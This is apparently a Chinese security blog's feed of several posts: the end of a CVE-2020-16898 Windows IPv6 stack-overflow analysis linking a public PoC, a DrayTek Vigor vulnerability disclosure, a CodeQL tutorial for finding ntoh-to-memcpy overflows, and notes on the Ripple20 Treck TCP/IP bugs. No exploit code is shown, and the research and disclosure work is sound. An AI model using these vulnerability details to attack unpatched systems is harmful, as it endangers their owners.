0x110：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" title="image-20201021004540686" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" alt="image-20201021004540686"></a></p><p>而Storage_1 为栈上的数组变量，将0x110个字节赋值过去，就会造成栈上的溢出，实际的崩溃是溢出覆盖了stack cookie，触发tcpip!_security_check_cookie，造成蓝屏（BSOD）：</p><p>最后贴一个蓝屏：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020040544.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020040544.png"></a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.quarkslab.com/beware-the-bad-neighbor-analysis-and-poc-of-the-windows-ipv6-router-advertisement-vulnerability-cve-2020-16898.html">https://blog.quarkslab.com/beware-the-bad-neighbor-analysis-and-poc-of-the-windows-ipv6-router-advertisement-vulnerability-cve-2020-16898.html</a></p><p><a href="http://site.pi3.com.pl/exp/p_CVE-2020-16898.py">http://site.pi3.com.pl/exp/p_CVE-2020-16898.py</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2020-16898 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DrayTek Vigor 2960 从未授权到rce</title>
      <link href="drayteck-vigor-vulnerability-disclosure.html"/>
      <url>drayteck-vigor-vulnerability-disclosure.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>4月多的时候出差去了南京，加上三月初的时候 360 netlab 公开两个 DrayTek 的漏洞，我也简单分析了一下以及复现了下 exploit ，这里就不细讲了。所以晚上无聊的时候在找这个设备的是否存在其他漏洞，刚好巧合的是  @C0ss4ck（之前在我司实习过） 他也在看，所以一起挖掘了以下 11个漏洞</p><p>这里公开的 PPT 由@C0ss4ck 和我完成，由于时间安排所以我没去 DEFCON GROUP 25</p><div class="row"><iframe src="https://drive.google.com/file/d/1z4QZctHU3XYB-X9jXiWrTGhMLJqP27ub/preview" style="width:100%; height:550px"></iframe></div><p>可能有的人就问了，11 个漏洞，为啥只有 2个 cve 号呢？ 很简单，由于某些原因大家都知道 CVE 似乎不怎么理个人申请了，所以我们拜托的厂商帮我们申请的，厂商把漏洞分成 命令注入和缓冲区溢出 一起分批申请的，然后 CVE 只给了两个编号 （orz）</p><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li>2020.05.29 report these vulnerabilities</li><li>2020.06.01 vendor reply</li><li>2020.06.04 vendor fix these vulnerabilities</li><li>2020.06.17 vendor released new firmware</li><li>2020.06.19 CVE-2020-14472, CVE-2020-14473</li></ul><h2 id="官方致谢"><a href="#官方致谢" class="headerlink" title="官方致谢"></a>官方致谢</h2><p><a href="https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-remote-code-injection/execution-vulnerability-(cve-2020-14472)/">https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-remote-code-injection/execution-vulnerability-(cve-2020-14472)/</a></p><p><a href="https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-stack-based-buffer-overflow-vulnerability-(cve-2020-14473)/">https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-stack-based-buffer-overflow-vulnerability-(cve-2020-14473)/</a></p><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><a href="https://gist.github.com/WinMin/46165779215f1d47ec257210428c0240">https://gist.github.com/WinMin/46165779215f1d47ec257210428c0240</a><br><a href="https://github.com/Cossack9989/Vulns/blob/master/IoT/CVE-2020-14473.md">https://github.com/Cossack9989/Vulns/blob/master/IoT/CVE-2020-14473.md</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DrayTek </tag>
            
            <tag> CVE-2020-14472 </tag>
            
            <tag> CVE-2020-14473 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CodeQL 的学习以及尝试漏洞挖掘</title>
      <link href="codeql.html"/>
      <url>codeql.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="CodeQL-背景"><a href="#CodeQL-背景" class="headerlink" title="CodeQL 背景"></a>CodeQL 背景</h2><p>CodeQL 是一个白盒源代码审计工具。其开发公司 Semmle 也成功和 Github 联姻，成立了 Github Security Lab，负责 Github 上开源软件的代码安全审计。</p><p>网上关于该工具的安装教程见官方文档，顺便一说网上的教程也不少，这里就不赘述了。</p><h2 id="CodeQL-使用"><a href="#CodeQL-使用" class="headerlink" title="CodeQL 使用"></a>CodeQL 使用</h2><p>官方提供了 QL 语法的文档： <a href="https://help.semmle.com/QL/ql-handbook/">https://help.semmle.com/QL/ql-handbook/</a> 以及 CodeQL 的一些 api 接口 <a href="https://help.semmle.com/qldoc/cpp/">https://help.semmle.com/qldoc/cpp/</a></p><p>关于CodeQL 使用，在这篇文章咱们以一个 Github Security Lab 公开的教程作为示例 </p><p>CodeQL CTF 2: U-Boot</p><ul><li><a href="https://securitylab.github.com/ctf/uboot">CTF 2: U-Boot Challenge</a> - Follow in the footsteps of our security research team and discover 13 vulnerabilities un U-Boot. Language: C - Difficulty level: </li></ul><h3 id="0x01-查找特定函数的定义"><a href="#0x01-查找特定函数的定义" class="headerlink" title="0x01 查找特定函数的定义"></a>0x01 查找特定函数的定义</h3><p>CodeQL 使用的时候需要通过 <code>import</code>  关键词导入特定语言的解析库，例如这里使用的是 <code>import cpp</code> ，如果我要查询 <code>strlen</code> 的函数定义，我只需要编写如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from Function f</span><br><span class="line">where f.getName() &#x3D; &quot;strlen&quot;</span><br><span class="line">select f, &quot;a function named strlen&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>右键点击运行，效果如下</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910173438.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910173438.png"></a></p><p>其中第三个是关于 <code>strlen</code> 的定义，</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910173541.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910173541.png"></a></p><h3 id="0x2-查找特定宏定义"><a href="#0x2-查找特定宏定义" class="headerlink" title="0x2 查找特定宏定义"></a>0x2 查找特定宏定义</h3><p>但是在 c 代码里， 有些情况我们需要查找宏的定义，这个时候就需要使用 <code>Macro</code> 这个 Predicates， 例如样例里提到的 <code>ntohs</code> 族，函数</p><!--**`ntohl`，`ntohll`和`ntohs`可以是函数或宏（取决于其中的代码被编译在平台上）。**--><p>另外， QL 语言支持正则匹配，我们可以通过 <code>regexpMatch</code> 匹配一类函数例如如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from Macro m</span><br><span class="line">where m.getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select m</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x3-函数的调用"><a href="#0x3-函数的调用" class="headerlink" title="0x3 函数的调用"></a>0x3 函数的调用</h3><p>在代码审计的场景里，我们在查找函数定义的同时，也需要根据函数调用查找完整的数据流，在 CodeQL 里，函数的调用通过 <code>FunctionCall</code> 这个 Predicates 可以直接完成，例如如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from FunctionCall c</span><br><span class="line">where c.getTarget().getName() &#x3D; &quot;memcpy&quot;</span><br><span class="line">select c</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910174736.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910174736.png"></a></p><h3 id="0x04-宏定义的调用"><a href="#0x04-宏定义的调用" class="headerlink" title="0x04 宏定义的调用"></a>0x04 宏定义的调用</h3><p>查找宏定义的的调用，使用 <code>MacroInvocation</code> 完成，代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from MacroInvocation mi</span><br><span class="line">where mi.getMacro().getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select mi</span><br></pre></td></tr></table></figure><h3 id="0x05-获取-ntohs-族宏定义的表达式"><a href="#0x05-获取-ntohs-族宏定义的表达式" class="headerlink" title="0x05 获取 ntohs 族宏定义的表达式"></a>0x05 获取 ntohs 族宏定义的表达式</h3><p>在 0x04 中，我们提到了宏定义的调用，另外我们知道， <code>ntoh</code> 族函数，通常用来进行网络字节序到主机字节序的转换，通常而言，如果是一个网络协议，我们可能会从某个字段中取出某个特定的值，并且赋值给某个变量，这个时候我们就需要获取他们的表达式。</p><p>这里以表达式出现的话，我们可以使用 <code>getExpr()</code>函数完成，仅仅只需要将 <code>select mi</code> 修改为 <code>select mi.getExpr()</code> ，效果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from MacroInvocation mi</span><br><span class="line">where mi.getMacro().getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select mi.getExpr()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910175832.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910175832.png"></a></p><p>例如这里的赋值语句就是第 78 个表达式</p><h3 id="0x06-编写一个-QL-类"><a href="#0x06-编写一个-QL-类" class="headerlink" title="0x06 编写一个 QL 类"></a>0x06 编写一个 QL 类</h3><p>QL 类包括三个部分</p><ol><li>关键字<code>class</code>。</li><li>类的名称。这是一个 以大写字母开头的<a href="https://help.semmle.com/QL/ql-spec/language.html#identifiers">标识符</a>。</li><li>要扩展的类型。</li><li><a href="https://help.semmle.com/QL/ql-handbook/types.html#class-bodies">类</a>的<a href="https://help.semmle.com/QL/ql-handbook/types.html#class-bodies">主体</a>，用大括号括起来。</li></ol><p>更多关于类的编写可以参考 <a href="https://help.semmle.com/QL/ql-handbook/types.html#classes">https://help.semmle.com/QL/ql-handbook/types.html#classes</a></p><p>这里我们需要编写尝试编写一个 <code>NetworkByteSwap</code> 的类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * An expression involved when swapping the byte order of network data.</span><br><span class="line"> * Its value is likely to have been read from the network.</span><br><span class="line"> *&#x2F;</span><br><span class="line">class NetworkByteSwap extends Expr &#123;</span><br><span class="line">  NetworkByteSwap() &#123;</span><br><span class="line">    exists(MacroInvocation mi |</span><br><span class="line">      mi.getMacroName().regexpMatch(&quot;ntoh(s|l|ll)&quot;) and</span><br><span class="line">      this &#x3D; mi.getExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from NetworkByteSwap n</span><br><span class="line">select n</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x07-数据流分析"><a href="#0x07-数据流分析" class="headerlink" title="0x07 数据流分析"></a>0x07 数据流分析</h3><p>现在我们来开始做数据流分析，<strong>通过定义源和接收器来创建<a href="https://help.semmle.com/qldoc/cpp/semmle/code/cpp/dataflow/TaintTracking.qll/type.TaintTracking$TaintTracking$Configuration.html">配置</a>类。</strong> 来源应该是调用<code>ntohl</code>，<code>ntohll</code>或<code>ntohs</code>。该接收器应为不安全调用memcpy的size参数。通过查找此类的数据流判断是否存在安全问题</p><p>这里需要使用 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br></pre></td></tr></table></figure><p>两个新库，然后我们要设置 来源和 Sink 的对象。</p><p>首先设置来源：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node source) &#123; source.asExpr() instanceof NetworkByteSwap &#125;</span><br></pre></td></tr></table></figure><p>设置来源对象为 表达式，是 <code>NetworkByteSwap</code> 这个类的值，<code>NetworkByteSwap</code> 这个类在 0x06 定义</p><p>然后设置接收器，接收器为 <code>memcpy</code> 的size 参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">  exists(FunctionCall c | c.getTarget().getName() &#x3D; &quot;memcpy&quot; and sink.asExpr() &#x3D; c.getArgument(2))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * An expression involved when swapping the byte order of network data.</span><br><span class="line"> * Its value is likely to have been read from the network.</span><br><span class="line"> *&#x2F;</span><br><span class="line">class NetworkByteSwap extends Expr &#123;</span><br><span class="line">  NetworkByteSwap() &#123;</span><br><span class="line">    exists(MacroInvocation mi |</span><br><span class="line">      mi.getMacroName().regexpMatch(&quot;ntoh(s|l|ll)&quot;) and</span><br><span class="line">      this &#x3D; mi.getExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Config extends TaintTracking::Configuration &#123;</span><br><span class="line">  Config() &#123; this &#x3D; &quot;Config: this name doesn&#39;t matter&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123; source.asExpr() instanceof NetworkByteSwap &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists(FunctionCall c | c.getTarget().getName() &#x3D; &quot;memcpy&quot; and sink.asExpr() &#x3D; c.getArgument(2))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where cfg.hasFlowPath(source, sink)</span><br><span class="line">select sink, source, sink, &quot;Network byte swap flows to memcpy&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果如下</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910183515.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910183515.png"></a></p><p>其中有多个明显的缓冲区溢出漏洞</p><h2 id="使用CodeQL-进行-0day-挖掘"><a href="#使用CodeQL-进行-0day-挖掘" class="headerlink" title="使用CodeQL 进行 0day 挖掘"></a>使用CodeQL 进行 0day 挖掘</h2><p>我们通过  CodeQL 编写了一个 ntoh -&gt; memcpy 的数据流追踪，当我们通过检查相应的代码我们即可分析是否有缓冲区溢出风险。我们学习了差不多了，我们可以通过这个成型的查询来查询一些类似这样的安全问题。</p><p>例如我通过这个查询，挖掘了两个缓冲区溢出漏洞。</p><p>大家也可以去尝试尝试。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> codeql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于 CVE-2020-11896和CVE-2020-11898 的学习笔记</title>
      <link href="Ripple20-overview.html"/>
      <url>Ripple20-overview.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>学习了一下这 ripper 20的两个洞</p><h2 id="CVE-2020-11896"><a href="#CVE-2020-11896" class="headerlink" title="CVE-2020-11896"></a>CVE-2020-11896</h2><h3 id="IPv4-分片"><a href="#IPv4-分片" class="headerlink" title="IPv4 分片"></a>IPv4 分片</h3><p>IP分片使得即使在IP分组的大小大于网络的特定链路中允许的最大大小的情况下，也可以在网络中发送IP分组。IP分段是一种将分组分成几个较小部分(“片段”)以支持在这些链路和网络上传输的技术。该协议支持TH分组的分段然后重组。</p><p>使用IP报头中的标识字段将不同的片段分组。该标识字段描述片段属于哪个分组。这允许不同的数据包在网络中分段传输，并在另一端正确重组。最后一个片段的MF(更多片段)位标志设置为0，而所有其他片段的MF=1。</p><p>网络堆栈负责对大型数据包进行分段，并通过网络发送多个分段。请求发送大型数据报的UDP应用程序就是一个例子。网络堆栈还负责在接收到分段的数据包时对其进行重组。</p><p>如果只有部分数据包碎片到达，网络堆栈最终会丢弃这些碎片。在大多数实现中，当处理任何片段时，网络堆栈启动计时器。当该计时器到期时，网络堆栈丢弃属于同一标识组的所有片段。</p><p>IPv4通过Flags及Fragment Offset字段对分片进行管理，Flags由R、DF、MF三部分组成：</p><p>● R（Reserve bit）保留未用</p><p>● DF (Don’t Fragment) DF =1：禁止分片 , DF =0：允许分片</p><p>● MF (More Fragment) MF =1：非最后一片, MF =0：最后一片(或未分片)</p><p>Fragment Offset(13位)：一个IP分组分片封装原IP分组数据的相对偏移量, 片偏移字段以8字节为单位。IP包结构如下图所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> 0                   1                   2                   3</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|Version|  IHL  |Type of Service|          Total Length         |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|         Identification        |Flags|      Fragment Offset    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|  Time to Live |    Protocol   |         Header Checksum       |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                       Source Address                          |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Destination Address                        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Options                    |    Padding    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><h3 id="IP-隧道"><a href="#IP-隧道" class="headerlink" title="IP 隧道"></a>IP 隧道</h3><p>IP隧道允许两个独立网络之间的虚拟点对点链路。它是通过将一个数据包(可以是IP数据包)封装在另一个数据包中来实现的，从而使内部数据包具有与外部数据包不同的源地址和目的地址。</p><p>外部数据包的源地址和目的地址是隧道端点，内部数据包中的地址用于隧道两端的网络路由。<br>隧道入口点是接收应该通过隧道转发的IP分组的节点。它将此数据包封装在外部IP数据包中。当数据包到达隧道出口点时，会将其解封并转发，就好像它是在目标网络中发送的常规数据包一样。<br>隧道使用的一个主要示例是虚拟专用网(VPN)技术。<br>有几种隧道协议，最简单、最古老的协议之一是IP-in-IP(IP协议号4)。</p><h4 id="IP-in-IP"><a href="#IP-in-IP" class="headerlink" title="IP-in-IP"></a>IP-in-IP</h4><p>IP-in-IP是一种IP隧道协议，在该协议中，通过添加具有分别等于隧道入口点和出口点的源地址和目的地址的外部IP报头，将一个IP数据包封装在另一个IP数据包中。<br>内部数据包未修改，外部IP报头从内部IP报头复制一些字段。外部标头的IP协议号为4。</p><h3 id="Treck-TCP-IP"><a href="#Treck-TCP-IP" class="headerlink" title="Treck TCP/IP"></a>Treck TCP/IP</h3><p>在 Treck TCP/IP 中，有个结构体用来描述其 TCP/IP栈，称为tsPacket。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tsPacket</span> &#123;</span></span><br><span class="line">ttUserPacket pktUserStruct;</span><br><span class="line">ttSharedDataPtr pktSharedDataPtr; <span class="comment">// Point to corresponding sharable ttSharedData struct tsPacket * pktChainNextPtr; // Next packet (head of a new datagram in a queue) struct tsDeviceEntry * pktDeviceEntryPtr; // pointer to network Device struct</span></span><br><span class="line"><span class="keyword">union</span> anon_union_for_pktPtrUnion pktPtrUnion; tt32Bit pktTcpXmitTime;</span><br><span class="line">tt16Bit pktUserFlags; tt16Bit pktFlags; tt16Bit pktFlags2;</span><br><span class="line">tt16Bit pktMhomeIndex;</span><br><span class="line">tt8Bit pktTunnelCount; <span class="comment">// Number of times this packet has been decapsulated. Initially set</span></span><br><span class="line">tt8Bit pktIpHdrLen; <span class="comment">// Number of bytes occupied by the IP header.</span></span><br><span class="line">tt8Bit pktNetworkLayer; <span class="comment">// Specifies the network layer type of this packet (IPv4, IPv6,</span></span><br><span class="line">‹→ ARP, etc).</span><br><span class="line">tt8Bit pktFiller[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是包含的ttUserPacket 结构（tsUserPacket的typedef ）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tsUserPacket</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span> * pktuLinkNextPtr; <span class="comment">// Next tsUserPacket for fragmented data</span></span><br><span class="line">ttUser8BitPtr pktuLinkDataPtr; <span class="comment">// Pointer to data</span></span><br><span class="line">ttPktLen pktuLinkDataLength; <span class="comment">// Size of data pointed by pktuLinkDataPtr</span></span><br><span class="line">ttPktLen pktuChainDataLength; <span class="comment">// Total packet length (of chained fragmented data). Valid</span></span><br><span class="line">‹→ in first link only.</span><br><span class="line"><span class="keyword">int</span> pktuLinkExtraCount; <span class="comment">// Number of links linked to this one (not including this one).</span></span><br><span class="line">‹→ Valid in first link only.</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pktuLinkDataPtr 指向当前片段的数据缓冲区。随着网络堆栈在不同阶段处理数据包并取决于当前正在处理的数据包层 ，此数据缓冲区内的确切位置会发生变化。 对于 例如，当网络栈处理所述以太网层（在tfEtherRecv ），该字段指向以太网报头。</p><p>pktuLinkDataLength字段指定pktuLinkDataPtr指向的数据的大小，即单个片段的大小。<br>pktuLinkNextPtr用于跟踪数据包中的片段。此字段指向表示下一个片段的另一个tsPacket，该片段又包含对下一个片段的引用，依此类推。因此，我们也可以在此链表中将片段称为“链接”。如果此链接是最后一个片段，或者如果数据未分段，则此字段将等于NULL。<br>pktuChainDataLength字段表示包括所有片段的分组长度，即分组的总大小。它只为第一个片段设置，如果数据没有分段，则等于pktuLinkDataLength。</p><p>堆栈中的一种常见模式是在堆栈中的各层之间移动时调整pktuLinkDataPtr指针。例如，如果我们的数据包是ICMP回应请求数据包(PING)，则它将由三层组成：以太网，然后是IPv4，最后是ICMP。在这种情况下，当以太网层被处理时(在函数tfEtherRecv中)，pktuLinkDataPtr指向以太网头的开始，然后在移动到下一层之前，使用以下代码对其进行调整：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pkt-&gt;pktuLinkDataPtr = pkt-&gt;pktuLinkDataPtr + <span class="number">0xe</span>;</span><br><span class="line">pkt-&gt;pktuLinkDataLength = pkt-&gt;pktuLinkDataLength - <span class="number">0xe</span>; </span><br><span class="line">pkt-&gt;pktuChainDataLength = pkt-&gt;pktuChainDataLength - <span class="number">0xe</span>;</span><br></pre></td></tr></table></figure><p>在本例中，0xE(十进制14)是以太网头的大小(6(Dst MAC)+6(Src MAC)+2(EtherType))。<br>当tfEtherRecv完成数据包处理时，它会使用代表下一层协议的EtherType字段将数据包转发到下一层处理。遇到的支持的以太网类型有ARP、IPv4和IPv6。</p><a href="https://lh4.googleusercontent.com/hELEgQOjkR6bZJsVt5BABrxheHT47maZrgrlrQQ_et0IyFebfxL1JhnUHtdEE-0TWN92dxV5i4AYbKqUru0fVz12lAyXlf0V-5fvHLepAWkJQSt8T-pO79BdoW6UZ821xxMUOpA" title="img" class="gallery-item"><img src="https://lh4.googleusercontent.com/hELEgQOjkR6bZJsVt5BABrxheHT47maZrgrlrQQ_et0IyFebfxL1JhnUHtdEE-0TWN92dxV5i4AYbKqUru0fVz12lAyXlf0V-5fvHLepAWkJQSt8T-pO79BdoW6UZ821xxMUOpA" alt="img" style="zoom:50%;" 